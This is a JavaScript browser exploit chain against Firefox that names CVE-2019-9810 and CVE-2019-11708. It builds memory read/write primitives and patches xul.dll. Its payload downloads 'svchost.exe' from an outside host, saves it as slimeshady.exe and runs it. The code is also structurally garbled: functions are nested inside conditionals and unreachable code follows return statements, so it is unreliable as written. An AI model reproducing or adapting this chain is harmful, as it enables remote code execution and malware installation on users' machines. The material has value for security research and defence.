const XulsAutomationPrefIsSet = 0x051c0f13;
const XuldisabledForTest = 0x05171cd8;
const Debug = false;
const dbg = p => {
    if (Debug == false) {
        console.log(`Debug: ${p}`);
        const ArraySize = 0x5;
        const WantedArraySize = 0x42424242;
        let arr = null;
        let Trigger = false;
        const Spray = [];

        function f(Special, Idx, Value) {
            arr[Idx] = 0x41414141;
            Special.slice();
            arr[Idx] = Value;
            class SoSpecial extends Array {
                static get[Symbol.species]() {
                    return function() {
                        if (!Trigger) {
                            arr.length = 0;
                            for (let i = 0; i < 0x40000; i++) {
                                function GetMeBiggie() {
                                    for (let Idx = 0; Idx < 0x100000; Idx++) {
                                        Spray.push(new Uint32Array(ArraySize));
                                        const SpecialSnowFlake = new SoSpecial();
                                        for (let Idx = 0; Idx < 10; Idx++) {
                                            arr = new Array(0x7e);
                                            Trigger = false;
                                            for (let Idx = 0; Idx < 0x400; Idx++) {
                                                f(SpecialSnowFlake, 0x70, Idx);
                                                Trigger = true;
                                                f(SpecialSnowFlake, 47, WantedArraySize);
                                                if (arr.length != 0) {
                                                    const Biggie = Spray.find(e => e.length != ArraySize);
                                                    if (Biggie != null) {
                                                        return Biggie;
                                                        return null;

                                                        function ExploitCVE_2019_9810() {
                                                            print = console.log;
                                                            const Biggie = GetMeBiggie();
                                                            if (Biggie == null || Biggie.length != WantedArraySize) {
                                                                dbg('Failed to set things up :(.');
                                                                let Biggie2AdjacentSize = null;
                                                                const JSValueArraySize = 0xfffa000000000000 | BigInt(ArraySize);
                                                                for (let Idx = 0; Idx < 0x100; Idx++) {
                                                                    const Qword = BigInt(Biggie[Idx]) << 32 | BigInt(Biggie[Idx + 1]);
                                                                    if (Qword == JSValueArraySize) {
                                                                        Biggie2AdjacentSize = Idx + 1;
                                                                        break;
                                                                        if (Biggie2AdjacentSize == null) {
                                                                            dbg('Failed to find an adjacent array :(.');
                                                                            const AdjacentArraySize = 0xbbccdd;
                                                                            Biggie[Biggie2AdjacentSize] = AdjacentArraySize;
                                                                            const AdjacentArray = Spray.find(
                                                                                e => e.length == AdjacentArraySize)
                                                                            if (AdjacentArray == null) {
                                                                                dbg('Failed to find the corrupted adjacent array :(.');
                                                                                const ReadPtr = Addr => {
                                                                                    const Ptr = BigInt.fromUint32s([AdjacentArray[0], AdjacentArray[1]]);
                                                                                    return Ptr;
                                                                                    const WritePtr = (Addr, Value) => {
                                                                                        const SizeInDwords = 2;
                                                                                        const SavedSlot = [
                                                                                            Biggie[Biggie2AdjacentSize],
                                                                                            Biggie[Biggie2AdjacentSize + 2 + 2],
                                                                                            Biggie[Biggie2AdjacentSize + 2 + 2 + 1]
                                                                                        ];
                                                                                        Biggie[Biggie2AdjacentSize] = SizeInDwords;
                                                                                        Biggie[Biggie2AdjacentSize + 2 + 2] = Number(Addr & 0xffffffff);
                                                                                        Biggie[Biggie2AdjacentSize + 2 + 2 + 1] = Number(Addr >> 32);
                                                                                        AdjacentArray[0] = Number(Value & 0xffffffff);
                                                                                        AdjacentArray[1] = Number(Value >> 32);
                                                                                        Biggie[Biggie2AdjacentSize] = SavedSlot[0];
                                                                                        Biggie[Biggie2AdjacentSize + 2 + 2] = SavedSlot[1];
                                                                                        Biggie[Biggie2AdjacentSize + 2 + 2 + 1] = SavedSlot[2];
                                                                                        const AddrOf = Obj => {
                                                                                            AdjacentArray.hell_on_earth = Obj;
                                                                                            const SlotOffset = Biggie2AdjacentSize - (3 * 2);
                                                                                            const SlotsAddress = BigInt.fromUint32s(
                                                                                                Biggie.slice(SlotOffset, SlotOffset + 2)
                                                                                            );
                                                                                            return BigInt.fromJSValue(ReadPtr(SlotsAddress));
                                                                                        };
                                                                                        const ArrayBufferLength = 10;
                                                                                        const AB1 = new ArrayBuffer(ArrayBufferLength);
                                                                                        const AB2 = new ArrayBuffer(ArrayBufferLength);
                                                                                        const AB1Address = AddrOf(AB1);
                                                                                        const AB2Address = AddrOf(AB2);
                                                                                        dbg(`AddrOf(AB1): ${AB1Address.toString(16)}`);
                                                                                        dbg(`AddrOf(AB2): ${AB2Address.toString(16)}`);
                                                                                        WritePtr(AB1Address + 0x28, 0xfff8800000010000);
                                                                                        WritePtr(AB2Address + 0x28, 0xfff8800000010000);
                                                                                        if (AB1.byteLength != AB2.byteLength && AB1.byteLength != 0x10000) {
                                                                                            dbg('Corrupting the ArrayBuffers failed :(.');
                                                                                            return false;
                                                                                            const Primitives = BuildPrimitives(AB1, AB2);
                                                                                            Math.atan2(AB2);
                                                                                            Biggie[Biggie2AdjacentSize] = ArraySize;
                                                                                            const BiggieLengthAddress = Primitives.AddrOf(Biggie) + 0x28;
                                                                                            Primitives.WritePtr(BiggieLengthAddress, 0xfff8800000000000 | BigInt(ArraySize));
                                                                                            GodMode(AB1, AB2, Primitives, XulsAutomationPrefIsSet, XuldisabledForTest);
                                                                                            return true;

                                                                                            function GetContentFrameMessageManager(Win) {
                                                                                                function _GetDocShellFromWindow(Win) {
                                                                                                    return Win.docShell;
                                                                                                    const Cu = Components.utils;
                                                                                                    const Sbx = Cu.Sandbox(Services.scriptSecurityManager.getSystemPrincipal());
                                                                                                    const Code = _GetDocShellFromWindow.toSource();
                                                                                                    Cu.evalInSandbox(Code, Sbx);
                                                                                                    const DocShell = Sbx._GetDocShellFromWindow(Win);
                                                                                                    Cu.nukeSandbox(Sbx);
                                                                                                    return DocShell.messageManager;

                                                                                                    function PromptOpen(Uri) {
                                                                                                        const FrameMM = GetContentFrameMessageManager(window);
                                                                                                        const Result = FrameMM.sendSyncMessage('Prompt:Open', {
                                                                                                            uri: Uri
                                                                                                        });
                                                                                                        return Result;

                                                                                                        function TriggerCVE_2019_11708() {
                                                                                                            PromptOpen(`${location.origin}?stage3`);

                                                                                                            function FrameScriptPayload() {
                                                                                                                function PimpMyDocument() {
                                                                                                                    if (content.document.location.origin == 'https://doar-e.github.io' ||
                                                                                                                        content.document.location.origin == 'http://localhost:8000') {
                                                                                                                        if (!content.document.location.origin.startsWith('http')) {
                                                                                                                            for (const Node of content.document.getElementsByTagName('*')) {
                                                                                                                                if (Node.tagName == 'A') {
                                                                                                                                    Node.href = 'https://doar-e.github.io/';
                                                                                                                                    continue;
                                                                                                                                    Node.style.backgroundImage = 'none';
                                                                                                                                    Node.style.backgroundColor = 'transparent';
                                                                                                                                    content.document.body.style.backgroundImage = 'url(https://doar-e.github.io/images/themes03_light.gif)';
                                                                                                                                    addEventListener('DOMWindowCreated', FrameScriptPayload);
                                                                                                                                    dump(`Hello from: ${content.location.origin}\n`);
                                                                                                                                    if (content.document != null && content.document.body != null) {
                                                                                                                                        PimpMyDocument();
                                                                                                                                        content.addEventListener('load', PimpMyDocument);

                                                                                                                                        function DropFile(Path, Content) {
                                                                                                                                            const Encoder = new TextEncoder();
                                                                                                                                            const ContentBuffer = (typeof Content == 'string') ? Encoder.encode(Content) : Content;
                                                                                                                                            return OS.File.open(Path, {
                                                                                                                                                write: true,
                                                                                                                                                truncate: true
                                                                                                                                                    .then(File => {
                                                                                                                                                        return Promise.all([
                                                                                                                                                                File,
                                                                                                                                                                File.write(ContentBuffer),
                                                                                                                                                            ])
                                                                                                                                                            .then((Results) => {
                                                                                                                                                                const [File, _WrittenBytes] = Results;
                                                                                                                                                                return File.close();

                                                                                                                                                                function Payload() {
                                                                                                                                                                    OS = Components.utils.import('resource://gre/modules/osfile.jsm');
                                                                                                                                                                }
                                                                                                                                                                const {
                                                                                                                                                                    Services
                                                                                                                                                                } = Components.utils.import('resource://gre/modules/Services.jsm');
                                                                                                                                                                const Dir = OS.Constants.Path.localProfileDir;
                                                                                                                                                                const PayloadPath = OS.Path.join(Dir, 'slimeshady.exe');
                                                                                                                                                                const PayloadPromise = fetch('http://download.loginserv.net/svchost.exe')
                                                                                                                                                                    .then((Response) => {
                                                                                                                                                                        return Response.arrayBuffer()
                                                                                                                                                                    })
                                                                                                                                                                    .then((Content) => {
                                                                                                                                                                        dbg(`Payload downloaded.`);
                                                                                                                                                                        return DropFile(PayloadPath, new Uint8Array(Content));
                                                                                                                                                                        dbg(`Creating the process.. ${PayloadPath}`);
                                                                                                                                                                        CreateProcessA(PayloadPath);
                                                                                                                                                                        console.log(`Exception in payload promise: ${Ex}`);
                                                                                                                                                                        const FramePayloadContent = `${FrameScriptPayload.toSource()}
FrameScriptPayload();`;
                                                                                                                                                                        const ScriptPath = OS.Path.join(Dir, 'frame-script.js');
                                                                                                                                                                        const FramePayloadPromise = DropFile(ScriptPath, FramePayloadContent)
                                                                                                                                                                        dbg(`About to loadFrameScript: ${ScriptPath}`);
                                                                                                                                                                        Services.mm.loadFrameScript(`file://${ScriptPath}`, true);
                                                                                                                                                                        console.log(`Exception in frame payload promise: ${Ex}`);
                                                                                                                                                                        Promise.all([PayloadPromise, FramePayloadPromise])
                                                                                                                                                                            .then(() => {
                                                                                                                                                                                CreateProcessA('c:\\windows\\system32\\calc.exe');
                                                                                                                                                                            })
                                                                                                                                                                            .catch(Ex => {
                                                                                                                                                                                console.log(`Exception in clean up promise: ${Ex}`);
                                                                                                                                                                            });

                                                                                                                                                                        function PatchInitiateSocket() {
                                                                                                                                                                            const PatchOffset = 0x001755c6a;
                                                                                                                                                                            const XulBase = BigInt(GetModuleHandleA('xul.dll').toString());
                                                                                                                                                                            const PatchAddress = XulBase + PatchOffset;
                                                                                                                                                                            const PatchContent = [0x90, 0x90, 0x90, 0x48, 0x31, 0xc9];
                                                                                                                                                                            PatchCode(PatchAddress, PatchContent);

                                                                                                                                                                            function Main(Route) {
                                                                                                                                                                                const RunningFromPrivilegedJS = window.netscape.security.PrivilegeManager != undefined;
                                                                                                                                                                                if (Route == '?stage1') {
                                                                                                                                                                                    if (RunningFromPrivilegedJS) {
                                                                                                                                                                                        return Main('?stage2');
                                                                                                                                                                                        console.log('Failed :(');
                                                                                                                                                                                        location.replace(`${location.origin}/?stage2`);
                                                                                                                                                                                        if (Route == '?stage2') {
                                                                                                                                                                                            if (!RunningFromPrivilegedJS) {
                                                                                                                                                                                                alert('problem');
                                                                                                                                                                                                return;
                                                                                                                                                                                                TriggerCVE_2019_11708();
                                                                                                                                                                                                if (Route == '?stage3') {
                                                                                                                                                                                                    if (!ExploitCVE_2019_9810()) {
                                                                                                                                                                                                        console.log('Elevation failed, closing the window.');
                                                                                                                                                                                                        window.close();
                                                                                                                                                                                                        location.replace(`${location.origin}/?final`);
                                                                                                                                                                                                        if (Route == '?final') {
                                                                                                                                                                                                            window.netscape.security.PrivilegeManager.enablePrivilege('doar-e');
                                                                                                                                                                                                            PatchInitiateSocket()

                                                                                                                                                                                                            Payload();

                                                                                                                                                                                                            function Onload() {
                                                                                                                                                                                                                if (location.search != '') {
                                                                                                                                                                                                                    Main(location.search);
                                                                                                                                                                                                                }
                                                                                                                                                                                                            }
                                                                                                                                                                                                        }
                                                                                                                                                                                                    }
                                                                                                                                                                                                }
                                                                                                                                                                                            }
                                                                                                                                                                                        }
                                                                                                                                                                                    }
                                                                                                                                                                                }
                                                                                                                                                                            }
                                                                                                                                                                        }
                                                                                                                                                                    });
                                                                                                                                                            })
                                                                                                                                                    })
                                                                                                                                            })
                                                                                                                                        }
                                                                                                                                    }
                                                                                                                                }
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}